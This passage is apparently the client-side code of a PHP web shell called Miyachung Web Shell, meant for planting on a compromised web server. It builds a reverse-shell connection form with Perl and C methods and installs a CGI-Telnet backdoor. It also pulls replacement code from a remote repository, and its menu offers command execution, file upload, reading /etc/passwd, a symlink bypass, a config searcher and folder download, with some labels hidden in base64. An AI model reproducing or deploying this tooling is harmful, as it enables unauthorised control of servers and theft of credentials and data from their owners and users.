            l.innerHTML = '<a style="color:blue;text-decoration:underline" href="https://github.com/miyachung/mws" target="_blank">https://github.com/miyachung/mws</a>', l.style.marginTop = "10px", A.appendChild(n), A.appendChild(i), e.appendChild(t), e.appendChild(o), e.appendChild(s), e.appendChild(l), e.appendChild(A), e.style.top = "50%", e.style.opacity = "1", e.style.visibility = "visible"
        }

        function process_update() {
            let e = document.getElementById("btn_update");
            e.disabled = !0, e.innerHTML = "UPDATING...";
            let t = new XMLHttpRequest;
            t.open("get", "https://raw.githubusercontent.com/miyachung/mws/main/mws.php", !0), t.onload = function() {
                if (4 == t.readyState) {
                    let e = this.response; - 1 !== e.indexOf(".mwsbox") ? process_update2(btoa(e)) : show_popup("Update can not processed!", 3500, "alert")
                }
            }, t.send()
        }

        function process_update2(e) {
            let t = document.getElementById("btn_update"),
                A = new FormData;
            A.append("update_content", e);
            let n = new XMLHttpRequest;
            n.open("post", basename(), !0), n.onload = function() {
                if (4 == n.readyState) {
                    t.disabled = !1, t.innerHTML = "UPDATE", sessionStorage.setItem("update_replied", !0), "ok" == JSON.parse(this.response).status ? (show_popup("Miyachung Webshell has been updated successfully!", 2e3, "success"), setTimeout(function() {
                        window.open("https://github.com/miyachung/mws", "_blank"), window.location.reload()
                    }, 2e3)) : show_popup("Some error occured,update can not processed!", 3500, "alert")
                }
            }, n.send(A)
        }

        function cancel_update() {
            empty_process_screen();
            let e = document.querySelector(".process-screen");
            e.style.top = "-50%", e.style.opacity = "0", e.style.visibility = "hidden", sessionStorage.setItem("update_replied", !0)
        }

        function cgi_telnet() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "CGI-Telnet Installation";
            let A = document.createElement("span");
            A.style.display = "block", A.style.color = "#222", A.style.fontSize = "14px", A.style.fontWeight = "bold", A.innerHTML = "Installing CGI-Telnet...";
            let n = new XMLHttpRequest;
            n.open("get", basename() + "?cgitelnet=true", !0), n.onload = function() {
                if (4 == n.readyState) {
                    "failed" == JSON.parse(this.response).status ? (show_popup("CGI-Telnet setup has failed!", 3e3, "alert"), e.style.visibility = "hidden", e.style.opacity = "0", e.style.top = "-50%") : (show_popup("CGI-Telnet has installed successfully!", 3e3, "success"), A.innerHTML = 'CGI-Telnet Path: <a href="cgi_web.pl" target="_blank" style="color:#555;text-decoration:underline;">cgi_web.pl</a><br>Permissions have been set up to 755..', list_dir("."))
                }
            }, n.send(), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function reverse_shell() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3"),
                A = document.createElement("form");
            A.setAttribute("id", "revshell"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("input");
            n.name = "rev_ip", n.style.display = "none", n.type = "text";
            let i = document.createElement("input");
            i.placeholder = "4444", i.style.display = "none", i.type = "text", i.name = "rev_port";
            let o = document.createElement("label");
            o.innerHTML = "Your IP Address", o.style.display = "none";
            let s = document.createElement("label");
            s.innerHTML = "Port", s.style.display = "none";
            let l = document.createElement("label");
            l.innerHTML = "Method", l.style.display = "none";
            let a = document.createElement("label");
            a.innerHTML = "Loading...", a.style.display = "block";
            let r = document.createElement("select");
            r.name = "method", r.style.display = "none";
            let c = document.createElement("option");
            c.value = "perl", c.innerHTML = "PERL";
            let d = document.createElement("option");
            d.value = "c", d.innerHTML = "C", r.appendChild(c), r.appendChild(d);
            let p = document.createElement("button");
            p.innerHTML = "CONNECT", p.style.display = "none", p.setAttribute("onclick", "process_reverse_shell();"), A.appendChild(o), A.appendChild(n), A.appendChild(s), A.appendChild(i), A.appendChild(l), A.appendChild(r), A.appendChild(p);
            let g = new FormData;
            g.append("getip", !0);
            let u = new XMLHttpRequest;
            u.open("post", basename(), !0), u.onload = function() {
                if (4 == u.readyState) {
                    let t = JSON.parse(this.response);
                    "failed" !== t.status ? (a.style.display = "none", o.style.display = "block", n.style.display = "block", n.value = t.status, s.style.display = "block", i.style.display = "block", l.style.display = "block", r.style.display = "block", p.style.display = "block") : (show_popup("Something went wrong!", 3e3, "alert"), e.style.visibility = "hidden", e.style.opacity = "0", e.style.top = "-50%")
                }
            }, u.send(g), t.innerHTML = "Reverse Shell", e.appendChild(t), e.appendChild(A), e.appendChild(a), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function process_reverse_shell() {
            let e = document.getElementById("revshell"),
                t = new FormData(e),
                A = e.querySelector("button"),
                n = e.querySelector("input[name=rev_ip]"),
                i = e.querySelector("input[name=rev_port]");
            if ("" == n.value || "" == i.value) show_popup("Empty field!", 3e3, "alert");
            else if (isNaN(i.value)) show_popup("Port must be numeric!", 3e3, "alert");
            else {
                A.disabled = !0, A.innerHTML = "CONNECTING...";
                let e = new XMLHttpRequest;
                e.open("post", basename(), !0), e.onload = function() {
                    if (4 == e.readyState) {
                        "ok" == JSON.parse(this.response).status ? show_popup("Check your listener!", 3e3, "success") : show_popup("Reverse shell can not be created!", 3500, "alert"), A.disabled = !1, A.innerHTML = "CONNECT"
                    }
                }, e.send(t)
            }
        }
        window.addEventListener("DOMContentLoaded", function() {
            if (check_disable()) return;
            check_update(), check_update2(), document.title = atob("TWl5YWNodW5nIFdlYiBTaGVsbA==") + " v" + release, document.querySelector(".mwsbox .title h3").innerHTML = atob("TWl5YWNodW5nIFdlYiBTaGVsbA==") + " v" + release;
            let e = document.querySelectorAll(".mwsbox .title ul li span");
            e[0].innerHTML = atob("V2ViIHNlcnZlciBzb2Z0d2FyZTo="), e[1].innerHTML = atob("S2VybmVsOg=="), e[2].innerHTML = atob("UnVubmluZyBhczo="), e[3].innerHTML = atob("VG90YWwgdXNlcnM6"), e[4].innerHTML = atob("VG90YWwgZ3JvdXBzOg=="), e[5].innerHTML = atob("c2FmZV9tb2RlOg=="), e[6].innerHTML = atob("b3Blbl9iYXNlZGlyOg=="), e[7].innerHTML = atob("RGlzYWJsZWQgZnVuY3Rpb25zOg=="), e[8].innerHTML = atob("dXBsb2FkX21heF9maWxlc2l6ZTo="), e[9].innerHTML = atob("TG9hZGVkIGV4dGVuc2lvbnM6"), e[10].innerHTML = atob("U2VydmVyIEluZm9ybWF0aW9uOg=="), e[11].innerHTML = atob("Q3VycmVudCBEaXJlY3Rvcnk6"), e[12].innerHTML = atob("Q2hhbmdlIERpcmVjdG9yeTo="), e[13].innerHTML = atob("UmVhZCBGaWxlOg=="), list_dir(), document.addEventListener("click", function(e) {
                let t = document.querySelectorAll(".toggle font"),
                    A = document.querySelectorAll(".toggle"),
                    n = document.querySelectorAll(".toggle span"),
                    i = document.querySelectorAll("i");
                "screen" !== e.target.id && -1 == [].slice.call(t).indexOf(e.target) && -1 == [].slice.call(A).indexOf(e.target) && -1 == [].slice.call(n).indexOf(e.target) && -1 == [].slice.call(i).indexOf(e.target) && e.target.offsetParent && "screen" !== e.target.offsetParent.id && (document.getElementById("screen").style.visibility = "hidden", document.getElementById("screen").style.opacity = "0", document.getElementById("screen").style.top = "-50%", setTimeout(function() {
                    empty_process_screen()
                }, 250))
            }), document.onkeyup = function(e) {
                27 == e.keyCode && "visible" == document.getElementById("screen").style.visibility && (document.getElementById("screen").style.visibility = "hidden", document.getElementById("screen").style.opacity = "0", document.getElementById("screen").style.top = "-50%")
            }, working_dir = document.getElementById("curr_dir").value, sessionStorage.getItem("work") || setWork()
        });
    </script>
    <link rel="icon" href="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAEQ0lEQVRoge2ZXUxbZRjHf0CHLbQFykr5OLVlbLCNjzFhycKSAjHuYp03GjPnojd+xizOeYFGMNnFFuPnEq8wcSbeEEzczTRb4hZFFiYIwiIgUFnHaMdgDFJLKcyLvl601MWZ+cHTdBB/yZOevk3e//P2ec95/uecFPvrp4jxKHAU2AUYuT8JAb3Ah8BXAKmgAHUc1BlQjaCMsbH7MYyxHL+M5YwOpfYDzQn5vxJLM9CjQ/FasjNZBUd1KFWb7CxWQa0OpUzJzmIVmHQoJTbbp4caKSnI5eLwBC3n+uLjTQ2VuGvLAKh//wsxPQAdKiI2WUlBLs58C5n6dFrO/hAfd9eW4cy3AKBlpuMPLYtppqIUYkG0mtZsI00NlaAUByoc8eQBOa1YpBJRiEWM2UCIhspNEFE8vnsb4eXf/liApF5ESVcgStewl3JnAQeqHFQWFzJ4deqOoktXQEUQixiXRicBeHnfbjL06fR5fH/aQnKaslsoVoSu8RsMX53CmZ/LbGCBtu7RtbWFUIr+X/zRxQx57/pNMlLsL35wx+yrRzMZ8C8s/eUxEP8uhU4JNjIAXzD8t8eS6IjINbJkIGolksE6qIDQAs62PI3R8ACH3mnDFwxz/AkXrupSLnsmeeWzrwHoPPEcAK7mT0Q0QdILAc5CK+6dJaAUrupSnIVW9uzYAkrxUn0lzkJrVFXwMipWgf7RCSpKNLY78rGbPPFkrTlm9m4tQrNmA3B57BqS21asEw95o35ns92Ge+cWAIbGoxbCVVFC2YM2AC4NeaU7sYwnae8eYXY+iM2SxfbifADOdA4AUGjNwmbJIrx0m/buEWkvFEEqvP5prBYz1aUOZud/pfX8j0xcv8lmzYazKA/v9RkxrZUQNXNj16YBosn6ZyCimJkL4CzKi54nIxOJMHNy5ewc8MRPrrGJG6Ai0c8YQ+M+0e2DipCiPfaGaCu2Z2cC4Ass3nNMCh0RYTM3H/pHY1KIPpVIBuvAC/3vRu9mb3UJrz7jxpihJxRepqNnkHc//1ZcBxJwEtstRj5qfpYMg54J/zQVpU4qSp1MTt2i/bufRLUgASexu648mrxvGtcLb9N08GE0Wy7ZJgOJuGCkaI8clu0DuSbOn3qLDIOe2bkA5zp6+fh0B765BUmZOGnmTbXHEHwNFAzf5vveQYqLNpKTZaKuppyD+/bg8Xi5MjUnprMSss+FlMJuMbKrvJjT57qoebKZnv6fyTDo2V9fI6ojfkOzwjaHjTcPP0V4aZm6h7Zis+YAEAwtit7IrJBmdtYck5zwytQcuZkbcGg2aqrKyM4yceFiH0fea5OUiZOi1T+fsE5m32gGwHcrmCiJxFoJ381AwuZeYR1YCaUWgLX6pjKkQ6k+oDHZmfxHenUodZK1u4CTaWZthwfYALiSnc2/5ATQmmbWqgC+AQaAfCAPSE9iYvdiEegCjgCtAL8DG4igMSriTdoAAAAASUVORK5CYII=">
</head>

<body>
    <div class="holder">

        <div class="mwsbox">

            <div class="bottom-menu">
                <ul>
                    <li class="toggle" onclick="reverse_shell();"><img style="width:16px;height:16px;" src="data:image/png;base64,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" /><span>Reverse Shell</span></li>
                    <li class="toggle" onclick="run_command();"><i class="fas fa-terminal"></i><span>Run Command</span></li>
                    <li class="toggle" onclick="file_upload();"><i class="fas fa-file-upload"></i><span>File Upload</span></li>
                    <li class="toggle" onclick="create_file();"><i class="fas fa-file"></i><span>Create File</span></li>
                    <li class="toggle" onclick="create_dir();"><i class="fas fa-folder-plus"></i><span>Create Directory</span></li>
                    <li class="toggle" onclick="download_folder();"><i class="fas fa-file-archive"></i><span>Download Folder</span></li>
                    <li class="toggle" onclick="search_disk();"><i class="fas fa-search"></i><span>Search Disk</span></li>
                    <li class="toggle" onclick="read_passwd();"><i><img src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAoklEQVQ4je2QQQ3CUBBEHziohVqohVrAQpGABTQgASxUApUAEkDC48CQLIQQAjfCJJP/d3d2shn442vM1E93B2BERW3VJrzVvOh1XjGgDilO4SLvSt2rh9JbFJ3qMC8nLYEJWAMj0AEt0AA9cMxsihaAanAOiahPfcx/90R3Z7CNcJMLmhiNuWTKrI/2ipJBVwKrwdYAa7CtCgnm8LD8Nn8AF5fx6FYl7EMnAAAAAElFTkSuQmCC"></i><span>Read /etc/passwd</span></li>
                    <li class="toggle" onclick="symlink();"><i><img style="width:16px;height:16px;" src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABJ0lEQVRYhe2T0W3DIBCGP3cDOoI7gjtCV/AK7gjxCM4I7QjpCPEIyQhZIRnh70OO6ESgjpo+RCqfhA6OA/47ACqVSqVSeSQkIWmQtJW0k7SRFCR1Nt5Jai0O5/PzQ9IPkia3XyupKOBNZ462QGYxUZK0ckIl6WCHlDhkxpcznxINndkZeAdG6wezAIPZ3uxnsscIPANfzvcCvAInoHVrryoQXOYx+8GVPGYTsz/aGl+BYLFTUsF4ZZJ0EZBWIABrl30LfLjKxKwmNz5ls7mRVEAPbDiXOWTio4A4l5b/bgFr27QDVuYbgb31907E7Px/g7ur4O4ybfEd9Ik/tya3R9AP33Cp+a93S3yxRdIrWKL09X5N4wfF0lwLmLnz9TdNsxxUqVT+Bd9dUuNpd1va5QAAAABJRU5ErkJggg=="></i><span>SYM Bypass</span></li>
                    <li class="toggle" onclick="config_searcher();"><i><img style="width:16px;height:16px;" src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABIklEQVRYhe1V2w2DMAy8Vl0gK7ACK9ARmIUV2hFYgRVgBDpCGaEd4fpRu7IChED5IydFMY6TO+w8gISEhISj4zQ3QDJ2jRJABuAeJDrNUs0LiGg9v+iXYlcjgrwU8pfYmwScI7RUAHppNQBn/IpCegegkdjGzK1X/T3wy8CNY/Qk3YTPlmQ0Z4sAS1KQzEi2QlKaEii5LYnG//bIHM8loKEw9gPAG8DV+EovPpd+ANCJ3Rn/agEPYzsRUIndTcQPJlaRhciDkLS2ksKnSedL0uuXwMmYH795D+iirVnoSTL3am7vgFxiVKjO3SzACnEcn2/n2bo51a+nqPlXQGzTEjRCrt/VMuM+AnJDqqgZuAn3eIymoEd0gJym1Y9RQkLCYfABnDR7je5K+3YAAAAASUVORK5CYII="></i><span>Config Searcher</span></li>
                    <li class="toggle" onclick="cgi_telnet();"><i><img style="width:16px;height:16px;" src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAACc0lEQVRYhe2X3XHqMBCFP5g04JRgSuCWQEogJZgSoAT8npdQApQAJeAS4hJwCcnD7o7WhgEZ29wXnxmN/KOfo9090gpGjBhxF5PV19er55wDJVDFNJ4Oy+UKa+AM/ABpTIdXEzQksQ3fhmRxAzlQIO4tYzq0sWAKfAMXLXsknjzWiPsuwFbfj1oAMv22jZ001oIpEjveNUtgAXwgVjFCnmwTifaJRqwF1zp4BXwqqUq/ZcgCjNBJ/6+IVOo9tLEgwEELwLv7762yIsSXJ/4U2qq4s0XaIpagWWSJuDVBRHJELOSJm8XmiPtfQnCndUpQsYmk0HLSNhnwy7WoBiVYIIHv964SEYwR88/oc/4qgjbhDJhomREEA+LSHBHPBFmQodA6d/2j0OdJskdcWgAbwhbkCbZGn2fxRus5Ih4jXNHB1X1acIfEZUYQR4mQizp3b6HvZOFEXSid8b/SrWg8a8GEkMlY+jQIpoR0qM2ub0I4cp1ydUXmxuaNcND3GjsdUEvJfAwac/9+Jhxb97ISb9EM2WIu+r5stF3o/18kuf0mqD6j7smjj8GUkFY1k8+5K583CPpV+9RroWWGbDVLJefnzLTNPx3HX6YW3oI75HjyOdwGOZaM1JLHMXdQQn4hZsWta/Ou7SpH9EBITAA+PMESicPaCrgW0KOU3TbsAyGurU/q6j3iXj9uSX1TP7XZZmyyvreUolHX4An648mQI8Tm1NUedem+gVL7HnTsRwlFMnU/1oiyzD0g7j1r2SKx9PS5SoivLaLgH4IgbVw//mWKXHKa7FeEDMREYSLqghwRngkjIdwCjZhZ9+X3nxEjRgyBP3xcmbgIVhRmAAAAAElFTkSuQmCC"></i><span>CGI-Telnet</span></li>
